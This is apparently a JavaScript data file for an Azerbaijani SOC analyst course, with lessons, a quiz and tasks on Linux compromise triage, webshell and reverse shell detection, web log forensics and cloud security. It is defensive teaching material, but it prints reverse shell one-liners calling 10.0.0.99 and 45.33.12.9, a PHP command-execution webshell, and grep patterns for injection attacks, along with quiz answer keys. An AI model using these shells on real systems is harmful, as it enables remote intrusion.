intro: "Linux kompromis analizi, webshell, log forensikası və veb server hücumlarının dərin aşkarlanması.",
lessons: [
{ title: "Linux kompromis göstəriciləri və triage", html: R`
<h3>Canlı Linux triage əmrləri</h3>
<pre># İstifadəçilər və giriş
cat /etc/passwd | awk -F: '$3==0'       # UID 0 hesablar
last -20 ; lastb -20                     # son giriş/uğursuz giriş
w ; who                                   # aktiv sessiyalar
cat /etc/sudoers; ls /etc/sudoers.d/

# Proseslər və şəbəkə
ps auxf                                   # proses ağacı
ss -tulpanp                               # bütün bağlantı + proses
ls -la /proc/*/exe 2>/dev/null | grep deleted   # silinmiş-amma-işləyən binary

# Persistence
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
ls -la /etc/systemd/system/ ~/.config/systemd/user/
cat ~/.bashrc ~/.profile /etc/profile.d/*
cat ~/.ssh/authorized_keys               # icazəsiz açar?
systemctl list-units --type=service --state=running

# Fayl anomaliyaları
find / -mtime -2 -type f 2>/dev/null     # son 2 gündə dəyişən
find /tmp /dev/shm /var/tmp -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null   # SUID (privesc)
find / -name ".*" -type f 2>/dev/null | grep -vE '^/(home|root|etc)'  # gizli fayllar</pre>
<h3>Şübhə əlamətləri</h3>
<ul><li>/tmp, /dev/shm-dan işləyən binary-lər</li><li>Yüksək CPU (cryptominer)</li>
<li>Qeyri-adi outbound bağlantılar (reverse shell, C2)</li><li>Silinmiş amma işləyən proseslər</li>
<li>Yeni SUID binary-lər, yeni cron/systemd, dəyişmiş authorized_keys</li>
<li>Dəyişdirilmiş sistem binary-ləri (rootkit): <code>rpm -Va</code> / <code>debsums</code> ilə yoxla</li>
<li>Tarixçə izləri: <code>~/.bash_history</code> (hücumçu çox vaxt silir və ya <code>unset HISTFILE</code> edir — boş history özü şübhədir)</li></ul>`},
{ title: "Reverse shell və webshell aşkarlaması", html: R`
<h3>Reverse shell</h3>
<p>Hədəf hücumçuya "geri" bağlanır (firewall adətən outbound-a icazə verir). Nümunələr:</p>
<pre>bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
nc -e /bin/sh 10.0.0.99 4444
python3 -c 'import socket,subprocess,os;...'
</pre>
<p><b>Aşkarlama:</b> <code>/dev/tcp</code> istifadəsi; <code>nc/ncat</code> ilə <code>-e</code>; bash/sh-in şəbəkə bağlantısı (auditd/Sysmon-for-Linux + şəbəkə); veb server istifadəçisinin (www-data) shell/python/nc başlatması; qeyri-adi outbound yüksək port.</p>
<h3>Webshell</h3>
<p>Veb qovluğa yüklənmiş zərərli skript uzaqdan əmr icrasına imkan verir.</p>
<ul><li><b>PHP nümunələri:</b> <code>&lt;?php system($_GET['cmd']); ?&gt;</code>, <code>eval($_POST[...])</code>, <code>passthru</code>, <code>base64_decode</code>, <code>assert</code>.</li>
<li><b>Aşkarlama (fayl):</b> veb kök qovluqda yeni/dəyişmiş .php/.aspx/.jsp; obfuscated PHP; YARA qaydaları; <code>find /var/www -name "*.php" -mtime -7</code>.</li>
<li><b>Aşkarlama (proses):</b> apache2/nginx/php-fpm/w3wp.exe-nin <code>sh/cmd/whoami/id</code> başlatması — güclü siqnal.</li>
<li><b>Aşkarlama (log):</b> access.log-da eyni .php faylına təkrar POST/GET + <code>cmd=</code> parametri; qeyri-adi User-Agent.</li></ul>
<h3>auditd (Linux audit)</h3>
<p>Linux-da proses/əmr/fayl girişini detallı loglayır. Nümunə qayda: icra olunan əmrləri izlə. Loglar: <code>/var/log/audit/audit.log</code>, <code>ausearch</code>/<code>aureport</code> ilə sorğu. Sysmon for Linux də alternativdir.</p>`},
{ title: "Veb server log forensikası", html: R`
<h3>Access log anatomy (Combined Log Format)</h3>
<pre>203.0.113.50 - - [12/Mar/2026:03:14:55 +0000] "GET /admin?id=1 HTTP/1.1" 200 1534 "http://ref" "Mozilla/5.0..."
    IP        user  [vaxt]              metod URL  proto  status bytes referer  User-Agent</pre>
<h3>Hücum nümunələrini tapmaq (grep)</h3>
<pre># SQL injection əlamətləri
grep -iE "union.*select|' or |information_schema|sleep\(|benchmark\(" access.log

# XSS
grep -iE "<script|%3Cscript|javascript:|onerror=" access.log

# Path traversal / LFI
grep -iE "\.\./|%2e%2e|/etc/passwd|boot.ini|php://|data://" access.log

# Command injection
grep -iE ";id|;whoami|%3Bid|\|whoami|&&|\\\$\(|nc " access.log

# Skaner alətləri (User-Agent)
grep -iE "sqlmap|nikto|nmap|gobuster|dirbuster|wpscan|masscan|python-requests|curl/" access.log

# Webshell girişi
grep -iE "\.php\?cmd=|shell|c99|r57|b374k|wso" access.log

# Ən çox 404/skan edən IP
awk '$9==404 {print $1}' access.log | sort | uniq -c | sort -nr | head</pre>
<h3>Təhlil strategiyası</h3>
<ol><li>Status kodları paylanması (çoxlu 404 = enumeration; 500 = injection; 200 şübhəli yola = uğur)</li>
<li>Top IP-lər və onların davranışı</li><li>Qeyri-adi User-Agent-lər</li>
<li>POST-lar (login, upload, webshell)</li><li>Vaxt korrelyasiyası (hücum pəncərəsi)</li>
<li>Uğurlu hücumu (200 + həssas yol) ayır</li></ol>
<div class="tip">IIS logları fərqli formatdadır (W3C, boşluqla ayrılmış, <code>C:\inetpub\logs\LogFiles\</code>). Sahələr fərqlidir amma məntiq eynidir. Veb hücum forensikasında əsas sual: "hansı sorğular UĞURLU oldu (200) və nə əldə etdilər?"</div>`},
{ title: "Container və cloud-native əsasları (SOC)", html: R`
<p>Müasir infrastruktur getdikcə container və cloud-dadır. L2 analitik əsasları bilməlidir.</p>
<h3>Docker/Container təhlükəsizliyi</h3>
<ul><li><b>Image riski:</b> zərərli/zəif public image-lər (Docker Hub). Image skanı (Trivy, Grype).</li>
<li><b>Container escape:</b> privileged container, mount edilmiş docker.sock, kernel exploit ilə host-a çıxış.</li>
<li><b>Əlamətlər:</b> container içindən host fayl sisteminə giriş, qeyri-adi proses, cryptominer (yüksək CPU), container-dan outbound C2.</li>
<li><b>Loglar:</b> Docker/containerd logları, Kubernetes audit log, Falco (runtime security, container üçün "Sysmon").</li></ul>
<h3>Kubernetes qısa</h3>
<ul><li><b>Pod, Node, Namespace, Service Account</b>. API server mərkəzdir.</li>
<li><b>Hücumlar:</b> açıq API server/dashboard, zəif RBAC, sirlər (secrets) sızması, kompromis pod-dan lateral movement.</li>
<li><b>Monitorinq:</b> K8s audit logları, anomal <code>kubectl exec</code>, yeni privileged pod.</li></ul>
<h3>Cloud (AWS/Azure/GCP) əsas log mənbələri</h3>
<table><tr><th>Platforma</th><th>Əsas audit log</th></tr>
<tr><td>AWS</td><td>CloudTrail (API), VPC Flow Logs, GuardDuty (detection), S3 access</td></tr>
<tr><td>Azure/Entra</td><td>Azure Activity, Entra ID Sign-in/Audit, Defender for Cloud</td></tr>
<tr><td>GCP</td><td>Cloud Audit Logs, VPC Flow</td></tr></table>
<h3>Tipik cloud hücumları</h3>
<ul><li>Sızmış access key (GitHub-a push edilmiş!) → resurs sui-istifadəsi (crypto mining)</li>
<li>Over-privileged IAM rolları, privilege escalation</li><li>Açıq S3 bucket (data leak)</li>
<li>SSRF ilə metadata credential oğurluğu (169.254.169.254)</li><li>MFA olmayan root/admin girişi</li>
<li>Konfiqurasiya dəyişiklikləri (logların söndürülməsi, yeni hesab)</li></ul>
<div class="note">Cloud-da "identity yeni perimetrdir". CloudTrail/Entra sign-in logları ilə anomal API çağırışları, impossible travel, yeni region istifadəsi, logların söndürülməsi (CloudTrail StopLogging!) izlənir. Cloud SOC getdikcə daha vacibdir.</div>`}
],
quiz: [
{ q: "Linux-da silinmiş amma işləyən binary-ni necə tapırsan?", o: ["ls -la /proc/*/exe | grep deleted", "ls /tmp", "cat /etc/passwd", "ps aux"], a: 0, e: "Malware özünü silib yaddaşda işləyə bilər." },
{ q: "bash -i >& /dev/tcp/IP/PORT 0>&1 nədir?", o: ["Reverse shell", "Normal əmr", "Backup skripti", "DNS sorğusu"], a: 0, e: "/dev/tcp ilə geri bağlantı." },
{ q: "www-data istifadəçisinin /bin/sh başlatması nəyə işarədir?", o: ["Webshell / veb server kompromisi", "Normal iş", "Sistem yeniləməsi", "Backup"], a: 0, e: "Veb proses shell başlatmamalıdır." },
{ q: "PHP-də <?php system($_GET['cmd']); ?> nədir?", o: ["Webshell", "Normal kod", "Şifrələmə", "Log faylı"], a: 0, e: "Uzaqdan əmr icrası backdoor-u." },
{ q: "auditd nə edir?", o: ["Linux-da proses/əmr/fayl girişini loglayır", "Firewall qurur", "Şifrələyir", "Backup alır"], a: 0, e: "/var/log/audit/audit.log." },
{ q: "access.log-da 'UNION SELECT' nəyə işarədir?", o: ["SQL injection cəhdi", "Normal sorğu", "XSS", "Path traversal"], a: 0, e: "Verilənlər bazasından məlumat çıxarma." },
{ q: "User-Agent 'sqlmap/nikto' nəyi göstərir?", o: ["Avtomatlaşdırılmış hücum aləti", "Mobil brauzer", "Axtarış motoru", "Normal istifadəçi"], a: 0, e: "Skaner/exploit alətləri." },
{ q: "Veb forensikada ən vacib sual hansıdır?", o: ["Hansı hücum sorğuları UĞURLU oldu (200 + həssas yol)", "Neçə sorğu gəldi", "Server markası", "RAM ölçüsü"], a: 0, e: "Uğurlu hücumu ayırmaq." },
{ q: "find / -perm -4000 nə tapır?", o: ["SUID faylları (privesc vektoru)", "Gizli faylları", "Böyük faylları", "Yeni faylları"], a: 0, e: "root SUID fayllar imtiyaz yüksəltmə üçün." },
{ q: "Boş ~/.bash_history niyə şübhəli ola bilər?", o: ["Hücumçu izləri silmiş ola bilər", "Normaldır həmişə", "Disk dolub", "Performans"], a: 0, e: "unset HISTFILE / silmə anti-forensikası." },
{ q: "AWS-də API çağırışlarını hansı log qeyd edir?", o: ["CloudTrail", "VPC Flow", "S3 bucket", "Route53"], a: 0, e: "Cloud audit logu." },
{ q: "Azure/Entra-da girişləri hansı log göstərir?", o: ["Entra ID Sign-in logs", "CloudTrail", "GCP Audit", "Syslog"], a: 0, e: "Azure identity logları." },
{ q: "Container escape nədir?", o: ["Container-dan host sisteminə çıxış", "Image endirmək", "Pod yaratmaq", "Log oxumaq"], a: 0, e: "Privileged/docker.sock/kernel exploit." },
{ q: "Falco nə üçündür?", o: ["Container/Kubernetes runtime təhlükəsizlik monitorinqi", "Image qurmaq", "DNS", "Backup"], a: 0, e: "Container üçün davranış aşkarlama." },
{ q: "169.254.169.254-ə cloud VM-dən sorğu nəyə işarə edə bilər?", o: ["SSRF ilə metadata credential oğurluğu", "Normal DNS", "Backup", "Patch"], a: 0, e: "Cloud metadata endpoint." },
{ q: "CloudTrail StopLogging hadisəsi niyə kritikdir?", o: ["Hücumçu audit loglarını söndürür (defense evasion)", "Normal əməliyyat", "Backup başlanğıcı", "Performans"], a: 0, e: "İzləri gizlətmək cəhdi." },
{ q: "GitHub-a sızmış AWS access key nə riski yaradır?", o: ["Resurs sui-istifadəsi (crypto mining), data oğurluğu", "Heç bir risk", "Yalnız yavaşlama", "Disk dolması"], a: 0, e: "Botlar GitHub-u key üçün skan edir — dəqiqələr içində." }
],
tasks: [
{ t: "Reverse shell tap", d: R`<p>auditd/əmr logundan:</p><pre>Mar 12 14:22:01 web01 CROND: (www-data) CMD (bash -c 'bash -i >& /dev/tcp/45.33.12.9/4444 0>&1')</pre>`, q: "Hücumçunun IP ünvanı hansıdır?", ans: ["45.33.12.9"], hint: "/dev/tcp/IP/PORT formatı.", sol: "45.33.12.9 (port 4444 — Metasploit default). www-data cron vasitəsilə reverse shell işlədib → webshell/RCE sonrası persistence. ATT&CK: T1059.004 + T1053.003 (cron persistence). Addım: cron qeydini sil, www-data-nın necə kompromis olunduğunu tap (webshell?), 45.33.12.9-u blokla, host-u araşdır, web kök qovluqda yeni .php faylları yoxla." },
{ t: "Webshell girişini tap", d: R`<p>nginx access.log:</p><pre>203.0.113.7 "POST /uploads/avatar.php HTTP/1.1" 200
203.0.113.7 "GET /uploads/avatar.php?cmd=whoami HTTP/1.1" 200
203.0.113.7 "GET /uploads/avatar.php?cmd=id HTTP/1.1" 200
203.0.113.7 "GET /uploads/avatar.php?cmd=cat+/etc/passwd HTTP/1.1" 200</pre>`, q: "Webshell faylının adı/yolu nədir?", ans: ["/uploads/avatar.php", "avatar.php", "uploads/avatar.php"], hint: "cmd= parametri qəbul edən .php.", sol: "/uploads/avatar.php — upload qovluğunda .php (file upload zəifliyi!), cmd= parametri ilə əmr icra edir (whoami, id, cat /etc/passwd — hamısı 200 = uğurlu). ATT&CK: T1505.003 (Web Shell). Addım: faylı sil/karantin et, upload funksiyasının zəifliyini araşdır (.php upload-a icazə?), serverdə digər dəyişiklikləri yoxla, 203.0.113.7 fəaliyyətini izlə, host kompromis sayılmalıdır." },
{ t: "Linux persistence hunt", d: R`<p>Kompromis şübhəsi olan serverdə yoxlanmalı persistence yerlərini sıralamaq istəyirsən.</p>`, q: "SSH açarı ilə persistence hansı faylda yoxlanır?", ans: ["~/.ssh/authorized_keys", "authorized_keys", ".ssh/authorized_keys", "~/.ssh/authorized_keys faylı"], hint: "İcazə verilən açıq açarlar.", sol: "~/.ssh/authorized_keys (hər istifadəçi üçün!) — icazəsiz açar = T1098.004. Tam persistence yoxlama siyahısı: crontab -l + /etc/cron.*, /etc/systemd/system/, ~/.bashrc/.profile/.ssh/authorized_keys, yeni UID 0 hesab, /etc/passwd dəyişiklikləri, SUID binary-lər, LD_PRELOAD. Hər birini yoxla və baseline ilə müqayisə et." },
{ t: "Linux/web forensik lab (praktika)", d: R`<p>Praktiki bacarıq qazan.</p>`, steps: ["CyberDefenders.org və ya Blue Team Labs Online-da pulsuz 'Linux' / 'Web' forensik tapşırığı seç", "Nümunə access.log tap (və ya öz Juice Shop/DVWA labından yarat) və yuxarıdakı grep nümunələri ilə hücumları çıxar", "Ubuntu VM-də auditd quraşdır, bir əmr işlət, ausearch ilə tap", "VM-də qəsdən webshell qoy (öz labında!), sonra access.log-da onu aşkarla", "Docker quraşdırıb bir container işlət, Falco demosuna bax"], sol: "CyberDefenders və BTLO real DFIR ssenariləri verir. Linux forensikası və log analizi L2-nin əsas bacarığıdır. Container/cloud biliyini də artır — bazar bu istiqamətə gedir." }
]
}
);
})();
